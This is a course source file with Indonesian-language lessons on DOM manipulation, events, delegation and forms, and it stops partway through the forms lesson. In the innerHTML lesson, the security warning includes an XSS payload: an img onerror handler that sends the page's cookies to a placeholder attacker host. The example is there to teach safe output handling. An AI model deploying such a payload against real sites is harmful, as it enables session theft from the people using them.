import {
  callout,
  checklist,
  code,
  divider,
  h2,
  ol,
  p,
  playground,
  table,
  ul,
} from '@/lib/content/builders';
import { type LessonDraft, written } from '@/lib/curriculum/authoring';

/**
 * Frontend Basic — Chapter 4, all thirteen lessons.
 *
 * This chapter is what makes React comprehensible later: everything React automates is done by
 * hand here first, so the reader knows what is being automated and why it is worth it.
 */
export const lessons: LessonDraft[] = [
  written(
    'apa-itu-dom',
    'Apa itu DOM & Pohon Node',
    9,
    'HTML sebagai struktur pohon yang bisa dibaca dan diubah dari kode.',
    [
      p(
        'Browser tidak menyimpan halamanmu sebagai teks HTML. Saat memuat, ia mengurai teks itu menjadi **pohon objek** — dan objek itulah yang dirender, diubah, dan dibaca JavaScript. Pohon itu disebut DOM (Document Object Model).',
      ),

      h2('Dari teks ke pohon'),
      code(
        'html',
        `
        <body>
          <h1 class="judul">Halo</h1>
          <p>Isi <strong>penting</strong></p>
        </body>
        `,
      ),
      code(
        'text',
        `
        document
        └── html
            └── body
                ├── h1.judul
                │   └── #text "Halo"
                └── p
                    ├── #text "Isi "
                    └── strong
                        └── #text "penting"
        `,
        { caption: 'Teks pun sebuah node — ini menjelaskan beberapa perilaku yang tampak aneh.' },
      ),

      h2('Jenis node yang perlu kamu tahu'),
      table(
        ['Jenis', 'Contoh', 'Catatan'],
        [
          ['Element', '`<div>`, `<p>`', 'Yang biasanya kamu maksud'],
          ['Text', '`"Halo"`, spasi, baris baru', 'Termasuk indentasi di HTML-mu'],
          ['Comment', '`<!-- -->`', 'Ikut ada di pohon'],
          ['Document', '`document`', 'Akar pohon'],
        ],
      ),
      code(
        'js',
        `
        const p = document.querySelector('p');

        p.childNodes.length;   // 2 — text node "Isi " DAN element <strong>
        p.children.length;     // 1 — hanya element

        // Hampir selalu kamu ingin 'children', bukan 'childNodes'.
        `,
      ),
      callout(
        'info',
        'DOM bukan HTML sumbermu',
        'Yang kamu lihat di tab Elements adalah keadaan **saat ini**, bukan berkas aslinya. Browser juga memperbaiki HTML yang salah (menutup tag yang lupa ditutup) dan JavaScript bisa mengubahnya kapan saja. "View source" menampilkan berkas; Elements menampilkan DOM.',
      ),

      h2('Kapan DOM siap'),
      code(
        'js',
        `
        // Skrip di <head> tanpa defer -> DOM belum ada
        document.querySelector('h1');   // null

        // Tiga solusi, dari yang terbaik:
        // 1. <script type="module" src="...">   — otomatis ditunda
        // 2. <script defer src="...">
        // 3. Taruh <script> tepat sebelum </body>

        // Kalau terpaksa:
        document.addEventListener('DOMContentLoaded', () => {
          document.querySelector('h1');   // sekarang ada
        });
        `,
      ),

      divider,
      h2('Rangkuman'),
      ul(
        'DOM adalah pohon objek hasil parsing HTML — bukan teks HTML itu sendiri.',
        'Spasi dan baris baru menjadi text node; `children` mengabaikannya, `childNodes` tidak.',
        'DOM mencerminkan keadaan sekarang, bukan berkas sumber.',
        '`type="module"` atau `defer` menjamin DOM sudah ada saat skrip berjalan.',
      ),
    ],
  ),

  written(
    'seleksi-elemen',
    'Menyeleksi Elemen',
    10,
    'Menemukan elemen yang ingin kamu ubah — dan menghindari jebakan koleksi hidup.',
    [
      h2('Yang perlu kamu pakai'),
      code(
        'js',
        `
        document.querySelector('.kartu');          // elemen PERTAMA yang cocok, atau null
        document.querySelectorAll('.kartu');       // NodeList semua yang cocok
        document.getElementById('menu');           // paling cepat, tapi hanya untuk id

        // Selector CSS apa pun berlaku
        document.querySelector('#daftar > li:first-child');
        document.querySelector('[data-status="aktif"]');
        document.querySelector('input[type="email"]');
        `,
      ),
      callout(
        'warning',
        '`querySelector` mengembalikan `null`, bukan error',
        'Salah ketik selector tidak melempar apa-apa — kamu baru tahu saat baris berikutnya melempar `Cannot read properties of null`. Untuk elemen yang wajib ada, periksa dan lempar error yang menjelaskan.',
      ),
      code(
        'js',
        `
        function wajibAda(selector, akar = document) {
          const el = akar.querySelector(selector);
          if (!el) throw new Error(\`Elemen tidak ditemukan: \${selector}\`);
          return el;
        }
        `,
      ),

      h2('Menyeleksi di dalam elemen, bukan seluruh dokumen'),
      code(
        'js',
        `
        const kartu = document.querySelector('.kartu');

        // SALAH: mencari di SELURUH halaman — bisa dapat tombol kartu lain
        const tombol = document.querySelector('.tombol');

        // BENAR: dibatasi ke dalam kartu ini
        const tombol2 = kartu.querySelector('.tombol');
        `,
      ),

      h2('NodeList bukan array'),
      code(
        'js',
        `
        const semua = document.querySelectorAll('.kartu');

        semua.forEach((el) => el.remove());   // forEach: ADA
        semua.map((el) => el.id);             // TypeError — map tidak ada

        [...semua].map((el) => el.id);        // ubah jadi array dulu
        Array.from(semua).filter(...);
        `,
      ),

      h2('Koleksi hidup vs statis — jebakan nyata'),
      code(
        'js',
        `
        const hidup  = document.getElementsByClassName('item');   // HIDUP
        const statis = document.querySelectorAll('.item');        // STATIS

        // Awalnya ada 3 item
        hidup.length;    // 3
        statis.length;   // 3

        document.querySelector('.item').remove();

        hidup.length;    // 2 — ikut berubah sendiri
        statis.length;   // 3 — potret saat dipanggil
        `,
      ),
      callout(
        'danger',
        'Loop atas koleksi hidup yang menghapus elemen akan melewati separuhnya',
        'Setiap penghapusan menggeser indeks koleksi hidup, sementara indeks loop terus maju. Untuk `getElementsByClassName`, salin dulu ke array (`[...koleksi]`), atau pakai `querySelectorAll` yang statis.',
      ),

      divider,
      h2('Rangkuman'),
      ul(
        '`querySelector` untuk satu, `querySelectorAll` untuk banyak — keduanya menerima selector CSS.',
        '`querySelector` mengembalikan `null` diam-diam; periksa untuk elemen yang wajib ada.',
        'Seleksi di dalam elemen induk, bukan seluruh dokumen.',
        'NodeList punya `forEach` tapi bukan array — sebar dengan `[...]` untuk `map`/`filter`.',
        '`getElementsBy*` menghasilkan koleksi hidup; salin dulu sebelum memodifikasi sambil me-loop.',
      ),
    ],
  ),

  written(
    'mengubah-konten',
    '`textContent` vs `innerHTML` vs `innerText`',
    12,
    'Tiga cara mengisi konten — dan satu di antaranya adalah celah keamanan.',
    [
      h2('Perbedaannya'),
      table(
        ['Property', 'Menafsirkan HTML?', 'Memperhitungkan CSS?', 'Biaya'],
        [
          ['`textContent`', 'Tidak — teks apa adanya', 'Tidak', 'Murah'],
          ['`innerHTML`', '**Ya** — mem-parse jadi elemen', 'Tidak', 'Mahal'],
          ['`innerText`', 'Tidak', '**Ya** — memicu perhitungan layout', 'Paling mahal'],
        ],
      ),
      code(
        'js',
        `
        el.textContent = '<b>tebal</b>';
        // Menampilkan literal: <b>tebal</b>

        el.innerHTML = '<b>tebal</b>';
        // Menampilkan: tebal (huruf tebal sungguhan)
        `,
      ),

      h2('Kenapa `innerHTML` berbahaya'),
      code(
        'js',
        `
        // Komentar dari pengguna:
        const komentar = '<img src=x onerror="fetch(\\'https://penyerang/?c=\\'+document.cookie)">';

        el.innerHTML = komentar;
        // Gambar gagal dimuat -> onerror berjalan -> cookie sesi terkirim ke penyerang.
        // Ini XSS, dan tidak butuh tag <script> sama sekali.
        `,
      ),
      callout(
        'danger',
        'Aturan yang tidak bisa ditawar',
        '**Data yang berasal dari pengguna tidak pernah boleh masuk ke `innerHTML`.** Termasuk nama, komentar, hasil pencarian, pesan error, dan apa pun dari API — karena API itu sendiri menerima input dari seseorang. Pakai `textContent`.',
      ),
      code(
        'js',
        `
        // AMAN — dirender sebagai teks, apa pun isinya
        el.textContent = komentar;

        // Kalau HTML memang WAJIB (misalnya konten dari editor):
        // sanitasi dulu dengan pustaka yang teruji, jangan menyaring sendiri.
        import DOMPurify from 'dompurify';
        el.innerHTML = DOMPurify.sanitize(htmlDariEditor);
        `,
      ),

      h2('`innerHTML` juga merusak yang sudah ada'),
      code(
        'js',
        `
        // Menghancurkan seluruh isi lalu membangun ulang:
        //   - event listener pada elemen lama hilang
        //   - fokus keyboard hilang
        //   - nilai input yang sedang diketik hilang
        //   - posisi scroll bisa lompat
        wadah.innerHTML += '<li>baru</li>';   // JANGAN — mem-parse ulang SEMUANYA

        // Menambahkan tanpa merusak yang lain:
        wadah.append(buatItem('baru'));
        `,
      ),

      h2('Kapan `innerText` berbeda'),
      code(
        'js',
        `
        // <p>Terlihat <span style="display:none">tersembunyi</span></p>
        p.textContent;   // 'Terlihat tersembunyi'
        p.innerText;     // 'Terlihat'   — menghormati CSS

        // innerText memaksa browser menghitung layout dulu.
        // Di dalam loop, ini penyebab lambat yang sering tidak disadari.
        `,
      ),

      h2('Menyisipkan HTML dengan aman: `insertAdjacentHTML`'),
      code(
        'js',
        `
        // Menyisipkan tanpa mem-parse ulang isi yang sudah ada
        wadah.insertAdjacentHTML('beforeend', '<li>baru</li>');

        // Posisi: 'beforebegin' | 'afterbegin' | 'beforeend' | 'afterend'
        // TETAP tidak boleh dipakai untuk data pengguna — ia tetap mem-parse HTML.
        `,
      ),

      divider,
      h2('Rangkuman'),
      ul(
        '`textContent` adalah default. Pakai yang lain hanya kalau ada alasan jelas.',
        'Data pengguna di `innerHTML` = XSS, tanpa perlu tag `<script>`.',
        '`innerHTML +=` mem-parse ulang seluruh isi dan menghapus listener, fokus, serta nilai input.',
        '`innerText` memperhitungkan CSS dan memaksa perhitungan layout — paling mahal.',
        'Kalau HTML memang wajib, sanitasi dengan pustaka teruji.',
      ),
    ],
  ),

  written(
    'atribut-property-dataset',
    'Atribut, Property & `dataset`',
    10,
    'Dua dunia yang mirip tapi tidak sama — dan kenapa nilai input sering tidak sesuai dugaan.',
    [
      p(
        '**Atribut** adalah yang tertulis di HTML. **Property** adalah yang ada di objek DOM. Saat halaman dimuat, atribut dipakai untuk mengisi property — tapi setelah itu keduanya bisa berpisah.',
      ),

      h2('Perbedaan yang paling sering menggigit'),
      code('html', `<input id="nama" value="awal">`),
      code(
        'js',
        `
        const input = document.querySelector('#nama');

        // Pengguna mengetik "Zum" ke dalam input
        input.value;                    // 'Zum'    — property: nilai SEKARANG
        input.getAttribute('value');    // 'awal'   — atribut: nilai AWAL di HTML

        input.defaultValue;             // 'awal'   — property yang mencerminkan atribut
        `,
      ),
      callout(
        'warning',
        'Selalu pakai `.value`, bukan `getAttribute("value")`',
        'Ini bug yang membuat form mengirim nilai lama. Aturan yang sama berlaku untuk `checked`, `selected`, dan `disabled` — semuanya punya versi atribut (keadaan awal) dan versi property (keadaan sekarang).',
      ),
      code(
        'js',
        `
        checkbox.checked;                    // true/false — keadaan sekarang
        checkbox.getAttribute('checked');    // '' atau null — hanya keadaan AWAL
        `,
      ),

      h2('`class` vs `className`'),
      code(
        'js',
        `
        el.className;                  // string penuh — 'kartu aktif besar'
        el.getAttribute('class');      // sama
        el.classList;                  // API yang sebaiknya kamu pakai (sub-bab berikutnya)
        `,
      ),

      h2('Kapan memakai atribut'),
      code(
        'js',
        `
        // Untuk atribut kustom dan ARIA, property-nya tidak ada — pakai setAttribute
        el.setAttribute('aria-expanded', 'true');
        el.setAttribute('role', 'dialog');
        el.removeAttribute('hidden');
        el.hasAttribute('disabled');    // true/false

        // Atribut boolean: yang menentukan adalah ADA atau TIDAK, bukan nilainya
        el.setAttribute('disabled', 'false');   // TETAP DISABLED — jebakan klasik
        el.removeAttribute('disabled');         // baru benar-benar aktif
        el.disabled = false;                    // atau lewat property
        `,
      ),

      h2('`data-*` dan `dataset`'),
      code('html', `<button data-id="42" data-status-kirim="menunggu">Kirim</button>`),
      code(
        'js',
        `
        const btn = document.querySelector('button');

        btn.dataset.id;            // '42'        — SELALU string
        btn.dataset.statusKirim;   // 'menunggu'  — data-status-kirim jadi camelCase

        btn.dataset.id = '43';                    // menulis
        Number(btn.dataset.id);                   // 43 — ubah sendiri kalau butuh angka

        delete btn.dataset.statusKirim;           // menghapus atributnya
        `,
      ),
      callout(
        'tip',
        '`data-*` menghubungkan DOM ke datamu',
        'Pola yang akan kamu pakai terus di sub-bab event delegation: satu listener di wadah, lalu `event.target.closest("[data-id]").dataset.id` untuk tahu baris mana yang diklik. Jangan simpan objek besar di sana — cukup identitasnya.',
      ),

      divider,
      h2('Rangkuman'),
      ul(
        'Atribut = keadaan awal di HTML; property = keadaan sekarang di objek DOM.',
        'Untuk `value`, `checked`, `selected`, `disabled` — selalu pakai property.',
        'Atribut boolean ditentukan keberadaannya, bukan nilainya.',
        'ARIA dan atribut kustom dipakai lewat `setAttribute`.',
        '`dataset` selalu mengembalikan string; `data-status-kirim` menjadi `dataset.statusKirim`.',
      ),
    ],
  ),

  written(
    'class-dan-style',
    'Class & Style: `classList`, CSS variable',
    10,
    'Mengubah tampilan tanpa menaburkan style inline ke seluruh kode.',
    [
      h2('`classList`'),
      code(
        'js',
        `
        el.classList.add('aktif');
        el.classList.remove('tersembunyi');
        el.classList.toggle('terbuka');            // ada -> hapus, tidak ada -> tambah
        el.classList.toggle('terbuka', kondisi);   // paksa sesuai boolean
        el.classList.contains('aktif');            // true/false
        el.classList.replace('lama', 'baru');

        el.classList.add('a', 'b', 'c');           // beberapa sekaligus
        `,
      ),
      callout(
        'tip',
        'Bentuk `toggle(nama, kondisi)` menghapus banyak `if`',
        '`el.classList.toggle("error", !valid)` menggantikan empat baris if/else, dan tidak mungkin lupa cabang sebaliknya.',
      ),

      h2('Kenapa class mengalahkan style inline'),
      code(
        'js',
        `
        // SALAH: tampilan tersebar di JavaScript, tidak bisa dipakai ulang,
        // sulit di-override, dan mengabaikan media query serta dark mode.
        el.style.backgroundColor = '#e5a13c';
        el.style.padding = '12px';
        el.style.borderRadius = '8px';

        // BENAR: tampilan tetap di CSS, JavaScript hanya mengubah keadaan
        el.classList.add('kartu-aktif');
        `,
      ),
      p('Aturan praktisnya: **JavaScript mengubah keadaan, CSS memutuskan tampilannya.**'),

      h2('Kapan `style` memang tepat'),
      code(
        'js',
        `
        // Nilai yang dihitung saat berjalan dan tidak mungkin ditulis di CSS
        bar.style.width = \`\${persen}%\`;
        tooltip.style.transform = \`translate(\${x}px, \${y}px)\`;
        `,
      ),

      h2('CSS custom property — jembatan terbaik'),
      code(
        'css',
        `
        .bar {
          width: var(--progres, 0%);
          background: var(--warna-bar, currentColor);
          transition: width 300ms ease-out;
        }
        `,
      ),
      code(
        'js',
        `
        // JavaScript hanya mengoper ANGKA; CSS yang memutuskan cara memakainya
        bar.style.setProperty('--progres', \`\${persen}%\`);

        // Membacanya kembali
        getComputedStyle(bar).getPropertyValue('--progres');
        `,
      ),
      callout(
        'info',
        'Ini pola yang dipakai website ini sendiri',
        'Tema terang/gelap di sini bekerja persis begitu: JavaScript hanya menambah atau menghapus class `dark` pada `<html>`, dan seluruh palet berpindah karena CSS variable-nya berubah. Tidak ada satu pun warna yang ditulis dari JavaScript.',
      ),

      h2('Membaca style yang benar-benar berlaku'),
      code(
        'js',
        `
        el.style.color;                          // '' — hanya membaca style INLINE
        getComputedStyle(el).color;              // 'rgb(25, 23, 19)' — hasil akhir

        // getComputedStyle memaksa perhitungan layout. Jangan panggil di dalam loop.
        `,
      ),

      divider,
      h2('Rangkuman'),
      ul(
        '`classList.toggle(nama, kondisi)` menggantikan if/else tampilan.',
        'JavaScript mengubah keadaan; CSS memutuskan tampilan.',
        '`style` langsung hanya untuk nilai yang dihitung saat berjalan.',
        'CSS custom property adalah jembatan terbaik antara keduanya.',
        '`getComputedStyle` membaca hasil akhir, tapi memicu perhitungan layout.',
      ),
    ],
  ),

  written(
    'membuat-menghapus-node',
    'Membuat, Menyisipkan & Menghapus Node',
    12,
    'Membangun elemen dari kode dengan aman dan efisien.',
    [
      h2('Membuat'),
      code(
        'js',
        `
        const li = document.createElement('li');
        li.textContent = judul;             // aman untuk data pengguna
        li.className = 'item';
        li.dataset.id = id;

        const teks = document.createTextNode('halo');
        `,
      ),

      h2('Menyisipkan'),
      code(
        'js',
        `
        wadah.append(li);          // di akhir — bisa beberapa sekaligus, boleh string
        wadah.prepend(li);         // di awal
        acuan.before(li);          // sebelum elemen acuan
        acuan.after(li);           // sesudah
        acuan.replaceWith(li);     // menggantikan

        wadah.append(a, b, 'teks biasa');   // campur elemen dan string
        `,
      ),
      callout(
        'info',
        'API lama yang masih sering kamu temui',
        '`appendChild`, `insertBefore`, `removeChild` masih bekerja dan ada di banyak kode. API modern (`append`, `before`, `remove`) lebih pendek, menerima beberapa argumen, dan menerima string — pakai yang modern untuk kode baru.',
      ),

      h2('Menghapus dan memindahkan'),
      code(
        'js',
        `
        el.remove();                 // hapus dirinya sendiri
        wadah.replaceChildren();     // kosongkan seluruh isi

        // Menyisipkan elemen yang SUDAH ada di DOM akan MEMINDAHKANNYA,
        // bukan menyalin. Ini fitur, dan sering mengejutkan.
        wadahLain.append(elemenYangSudahAda);   // pindah, bukan duplikat

        const salinan = el.cloneNode(true);     // true = ikut seluruh isinya
        `,
      ),

      h2('Kenapa menyisipkan di dalam loop itu mahal'),
      code(
        'js',
        `
        // LAMBAT: setiap append menyentuh DOM yang sedang tampil
        for (const item of seribuItem) {
          wadah.append(buatBaris(item));
        }
        `,
      ),
      code(
        'js',
        `
        // CEPAT: rakit di luar DOM dulu, sisipkan sekali
        const fragment = document.createDocumentFragment();
        for (const item of seribuItem) {
          fragment.append(buatBaris(item));
        }
        wadah.append(fragment);       // satu kali sentuhan ke DOM

        // Alternatif yang sama cepatnya dan lebih pendek:
        wadah.append(...seribuItem.map(buatBaris));
        `,
      ),
      callout(
        'tip',
        'Kenapa `DocumentFragment` cepat',
        'Ia adalah wadah yang tidak berada di dalam dokumen, jadi menambahkan sesuatu ke dalamnya tidak memicu perhitungan layout. Saat disisipkan, isinya dipindahkan dan fragment-nya sendiri menghilang — tidak ada elemen pembungkus tambahan.',
      ),

      h2('Pola merender daftar dengan aman'),
      code(
        'js',
        `
        function renderDaftar(wadah, items) {
          wadah.replaceChildren();                    // kosongkan

          if (items.length === 0) {
            const kosong = document.createElement('p');
            kosong.className = 'kosong';
            kosong.textContent = 'Belum ada tugas. Tambahkan yang pertama.';
            wadah.append(kosong);
            return;                                   // keadaan kosong ditangani
          }

          const fragment = document.createDocumentFragment();

          for (const item of items) {
            const li = document.createElement('li');
            li.dataset.id = item.id;

            const label = document.createElement('span');
            label.textContent = item.judul;          // AMAN — bukan innerHTML

            const hapus = document.createElement('button');
            hapus.type = 'button';
            hapus.dataset.aksi = 'hapus';
            hapus.textContent = 'Hapus';

            li.append(label, hapus);
            fragment.append(li);
          }

          wadah.append(fragment);
        }
        `,
      ),

      divider,
      h2('Rangkuman'),
      ul(
        '`append`, `prepend`, `before`, `after`, `remove` — API modern, menerima beberapa argumen.',
        'Menyisipkan elemen yang sudah ada akan memindahkannya, bukan menyalin.',
        'Rakit di `DocumentFragment` lalu sisipkan sekali untuk daftar besar.',
        '`replaceChildren()` mengosongkan wadah tanpa `innerHTML = ""`.',
        'Selalu tangani keadaan kosong secara eksplisit.',
      ),
    ],
  ),

  written(
    'event-dasar',
    'Event: `addEventListener` & objek Event',
    12,
    'Bereaksi terhadap tindakan pengguna — dan membersihkannya kembali.',
    [
      h2('Dasar'),
      code(
        'js',
        `
        function tangani(event) {
          console.log(event.type);   // 'click'
        }

        tombol.addEventListener('click', tangani);
        tombol.removeEventListener('click', tangani);   // butuh referensi fungsi YANG SAMA
        `,
      ),
      callout(
        'warning',
        'Fungsi anonim tidak bisa dilepas',
        '`addEventListener("click", () => {})` membuat fungsi baru setiap dipanggil, jadi `removeEventListener` tidak akan pernah menemukan pasangannya. Simpan referensinya, atau pakai `AbortController`.',
      ),
      code(
        'js',
        `
        // Cara modern melepas banyak listener sekaligus
        const controller = new AbortController();

        tombol.addEventListener('click', a, { signal: controller.signal });
        input.addEventListener('input', b, { signal: controller.signal });
        window.addEventListener('resize', c, { signal: controller.signal });

        controller.abort();   // ketiganya lepas sekaligus
        `,
      ),

      h2('Objek Event'),
      code(
        'js',
        `
        wadah.addEventListener('click', (e) => {
          e.type;             // 'click'
          e.target;           // elemen yang BENAR-BENAR diklik (bisa anak terdalam)
          e.currentTarget;    // elemen tempat listener terpasang — di sini: wadah
          e.timeStamp;

          // Khusus mouse
          e.clientX; e.clientY;      // relatif viewport
          e.button;                  // 0 kiri, 1 tengah, 2 kanan

          // Khusus keyboard
          e.key;                     // 'Enter', 'a', 'Escape'
          e.ctrlKey; e.metaKey; e.shiftKey;
        });
        `,
      ),
      callout(
        'danger',
        '`target` vs `currentTarget` — sumber bug yang sering',
        'Klik pada `<button><span>Hapus</span></button>` membuat `e.target` bernilai `<span>`, bukan tombolnya. Untuk mendapatkan elemen yang kamu maksud, pakai `e.target.closest("button")`.',
      ),

      h2('`preventDefault` dan `stopPropagation`'),
      code(
        'js',
        `
        form.addEventListener('submit', (e) => {
          e.preventDefault();       // batalkan perilaku bawaan (reload halaman)
          kirimLewatFetch();
        });

        link.addEventListener('click', (e) => {
          e.preventDefault();       // jangan pindah halaman
        });

        // stopPropagation menghentikan event naik ke induk.
        // Pakai HEMAT: ia sering memutus listener global orang lain
        // (menutup dropdown saat klik di luar, misalnya).
        e.stopPropagation();
        `,
      ),

      h2('Opsi listener'),
      table(
        ['Opsi', 'Gunanya'],
        [
          ['`once: true`', 'Otomatis lepas setelah dipanggil sekali'],
          [
            '`passive: true`',
            'Berjanji tidak memanggil `preventDefault` — membuat scroll tetap mulus',
          ],
          ['`capture: true`', 'Tangkap saat turun, bukan saat naik'],
          ['`signal`', 'Lepas lewat `AbortController`'],
        ],
      ),
      code(
        'js',
        `
        // Untuk listener scroll dan touch, passive hampir selalu benar
        window.addEventListener('scroll', tangani, { passive: true });

        dialog.addEventListener('close', bersihkan, { once: true });
        `,
      ),

      h2('Membersihkan listener'),
      code(
        'js',
        `
        // Listener pada window/document TIDAK hilang saat elemenmu dihapus.
        // Kalau tidak dilepas, ia terus berjalan dan menahan objek di memori —
        // ini kebocoran memori yang paling umum di aplikasi satu halaman.
        `,
      ),

      divider,
      h2('Rangkuman'),
      ul(
        'Fungsi anonim tidak bisa dilepas; simpan referensinya atau pakai `signal`.',
        '`e.target` adalah yang diklik; `e.currentTarget` adalah tempat listener dipasang.',
        '`e.target.closest("button")` mendapatkan elemen yang kamu maksud.',
        '`{ passive: true }` untuk scroll dan touch; `{ once: true }` untuk sekali pakai.',
        'Listener pada `window`/`document` wajib dilepas — kalau tidak, memori bocor.',
      ),
    ],
  ),

  written(
    'bubbling-delegation',
    'Bubbling, Capturing & Event Delegation',
    13,
    'Satu listener untuk seratus elemen — termasuk yang belum ada.',
    [
      h2('Tiga fase perjalanan event'),
      code(
        'text',
        `
        Klik pada <button> di dalam <li> di dalam <ul>:

        1. CAPTURING  document -> ul -> li -> button   (turun)
        2. TARGET     button                            (sampai)
        3. BUBBLING   button -> li -> ul -> document    (naik)

        Secara default, listener berjalan pada fase BUBBLING.
        `,
      ),
      code(
        'js',
        `
        ul.addEventListener('click', () => console.log('ul (bubbling)'));
        ul.addEventListener('click', () => console.log('ul (capturing)'), { capture: true });
        btn.addEventListener('click', () => console.log('button'));

        // Output saat tombol diklik:
        // ul (capturing)
        // button
        // ul (bubbling)
        `,
      ),

      h2('Event delegation'),
      code(
        'js',
        `
        // SALAH: satu listener per baris. 100 baris = 100 listener,
        // dan baris yang ditambahkan nanti tidak punya listener sama sekali.
        document.querySelectorAll('.hapus').forEach((btn) => {
          btn.addEventListener('click', hapusBaris);
        });
        `,
      ),
      code(
        'js',
        `
        // BENAR: satu listener di wadah, selamanya
        daftar.addEventListener('click', (e) => {
          const tombol = e.target.closest('[data-aksi]');
          if (!tombol || !daftar.contains(tombol)) return;   // klik di luar sasaran

          const id = tombol.closest('[data-id]')?.dataset.id;

          switch (tombol.dataset.aksi) {
            case 'hapus':  hapus(id); break;
            case 'ubah':   ubah(id); break;
            case 'toggle': toggle(id); break;
          }
        });
        `,
      ),
      p(
        'Baris yang ditambahkan lima menit kemudian otomatis ikut tertangani. Tidak ada listener yang perlu dipasang atau dilepas.',
      ),

      callout(
        'tip',
        'Kenapa `closest` wajib di sini',
        '`e.target` bisa berupa `<span>` atau ikon di dalam tombol. `closest("[data-aksi]")` naik dari titik klik sampai menemukan elemen yang punya atribut itu — yang persis kamu maksud, apa pun isi dalamnya.',
      ),

      h2('Event yang tidak menggelembung'),
      table(
        ['Event', 'Menggelembung?', 'Solusinya'],
        [
          ['`click`, `input`, `change`, `submit`', 'Ya', '—'],
          ['`focus` / `blur`', '**Tidak**', 'Pakai `focusin` / `focusout`'],
          ['`mouseenter` / `mouseleave`', '**Tidak**', 'Pakai `mouseover` / `mouseout`'],
          ['`scroll` (pada elemen)', '**Tidak**', 'Pakai `capture: true`'],
          ['`load`, `error`', '**Tidak**', 'Pasang langsung pada elemennya'],
        ],
      ),

      h2('Jebakan `stopPropagation`'),
      code(
        'js',
        `
        // Dropdown menutup saat klik di mana pun
        document.addEventListener('click', tutupSemuaDropdown);

        // Lalu seseorang menambahkan ini di dalam kartu:
        kartu.addEventListener('click', (e) => e.stopPropagation());

        // Sekarang dropdown TIDAK PERNAH tertutup kalau kliknya di dalam kartu.
        // Bugnya muncul di tempat yang sama sekali berbeda dari penyebabnya.
        `,
      ),
      callout(
        'warning',
        'Hampir selalu ada cara lain selain `stopPropagation`',
        'Alih-alih menghentikan event, periksa di listener global: `if (dropdown.contains(e.target)) return;`. Efeknya lokal dan tidak memutus perilaku komponen lain.',
      ),

      h2('Contoh utuh'),
      playground(
        'vanilla',
        {
          '/index.html': `<!doctype html>
<html lang="id">
  <head><meta charset="utf-8" /><title>Event Delegation</title></head>
  <body>
    <h1>Daftar tugas</h1>
    <button id="tambah" type="button">Tambah baris</button>
    <ul id="daftar"></ul>
    <script type="module" src="./index.js"></script>
  </body>
</html>
`,
          '/index.js': `const daftar = document.querySelector('#daftar');
let nomor = 0;

document.querySelector('#tambah').addEventListener('click', () => {
  nomor++;
  const li = document.createElement('li');
  li.dataset.id = String(nomor);

  const label = document.createElement('span');
  label.textContent = 'Tugas ' + nomor;

  const hapus = document.createElement('button');
  hapus.type = 'button';
  hapus.dataset.aksi = 'hapus';
  hapus.textContent = 'Hapus';

  li.append(label, ' ', hapus);
  daftar.append(li);
});

// SATU listener — menangani baris yang sudah ada maupun yang belum dibuat
daftar.addEventListener('click', (e) => {
  const tombol = e.target.closest('[data-aksi]');
  if (!tombol) return;

  const baris = tombol.closest('[data-id]');
  console.log('Menghapus baris', baris.dataset.id);
  baris.remove();
});

// Cobalah: tambah lima baris, lalu hapus. Perhatikan tidak ada listener
// yang pernah dipasang ke tombol hapus mana pun.
`,
        },
        'Event delegation — coba sendiri',
      ),

      divider,
      h2('Rangkuman'),
      ul(
        'Event turun (capturing), sampai (target), lalu naik (bubbling). Default: bubbling.',
        'Satu listener di wadah menangani semua anak, termasuk yang ditambahkan kemudian.',
        '`e.target.closest(selector)` mendapatkan elemen yang kamu maksud, bukan yang persis diklik.',
        '`focus`, `blur`, `mouseenter`, `mouseleave` tidak menggelembung — ada penggantinya.',
        '`stopPropagation` memutus listener global orang lain; hampir selalu ada cara lain.',
      ),
    ],
  ),

  written(
    'form-input',
    'Form & Input: `FormData`, validasi',
    13,
    'Mengambil dan memvalidasi masukan pengguna — dan kenapa validasi klien bukan pengaman.',
    [
      h2('Tiga event yang berbeda'),
      table(
        ['Event', 'Kapan terpicu'],
        [
          ['`input`', 'Setiap ketikan — untuk pratinjau langsung'],
          ['`change`', 'Setelah selesai dan kehilangan fokus (atau memilih)'],
          ['`submit`', 'Pada `<form>`, bukan pada tombolnya'],
        ],
      ),
      callout(
        'danger',
        'Pasang listener pada `<form>`, bukan pada tombol',
        'Menekan Enter di dalam input juga mengirim form. Listener yang hanya ada di tombol akan melewatkannya sepenuhnya — dan halaman akan memuat ulang tanpa penjelasan.',
      ),

      h2('`FormData`'),
      code(
        'html',
        `
        <form id="daftar">
          <label for="nama">Nama</label>
          <input id="nama" name="nama" required autocomplete="name" />

          <label for="email">Email</label>
          <input id="email" name="email" type="email" required autocomplete="email" />

          <label>
            <input type="checkbox" name="setuju" /> Saya setuju
          </label>

          <button type="submit">Daftar</button>
        </form>
        `,
      ),
      code(
        'js',
        `
        const form = document.querySelector('#daftar');

        form.addEventListener('submit', (e) => {
          e.preventDefault();

          const fd = new FormData(form);

          fd.get('nama');                    // 'Zum'
          fd.get('setuju');                  // 'on' atau null
          Object.fromEntries(fd);            // { nama: 'Zum', email: '...' }

          // Untuk field yang boleh berulang (checkbox dengan nama sama)
          fd.getAll('minat');                // ['a', 'b']
        });
        `,
      ),
      callout(
        'warning',
        '`FormData` hanya membaca input yang punya atribut `name`',
        'Bukan `id`. Input tanpa `name` diabaikan diam-diam — dan ini penyebab "kenapa fieldnya kosong" yang paling sering.',
      ),

      h2('Validasi bawaan HTML'),
      code(
        'html',
        `
        <input
          name="email"
          type="email"
          required
          minlength="5"
          maxlength="100"
          autocomplete="email"
        />
        <input name="umur" type="number" min="17" max="120" />
        <input name="kode" pattern="[A-Z]{3}-\\d{4}" />
        `,
      ),
      code(
        'js',
        `
        input.checkValidity();      // true/false
        input.validity.tooShort;    // detail kenapa gagal
        input.validity.typeMismatch;
        input.validationMessage;    // pesan bawaan browser, sudah diterjemahkan

        // Pesan kustom
        input.setCustomValidity(sudahDipakai ? 'Email ini sudah terdaftar' : '');
        `,
      ),

      h2('Menampilkan error dengan benar'),
      code(
        'js',
        `
        function tampilkanError(input, pesan) {
          const kotak = document.querySelector(\`#error-\${input.name}\`);

          kotak.textContent = pesan;                       // teks, bukan HTML
          input.setAttribute('aria-invalid', String(Boolean(pesan)));
          input.setAttribute('aria-describedby', kotak.id);
        }

        form.addEventListener('submit', (e) => {
          e.preventDefault();

          if (!form.checkValidity()) {
            const pertamaGagal = form.querySelector(':invalid');
            pertamaGagal?.focus();          // arahkan pengguna ke masalahnya
            return;
          }

          kirim(new FormData(form));
        });
        `,
      ),
      callout(
        'tip',
        'Tiga hal yang sering terlewat pada form',
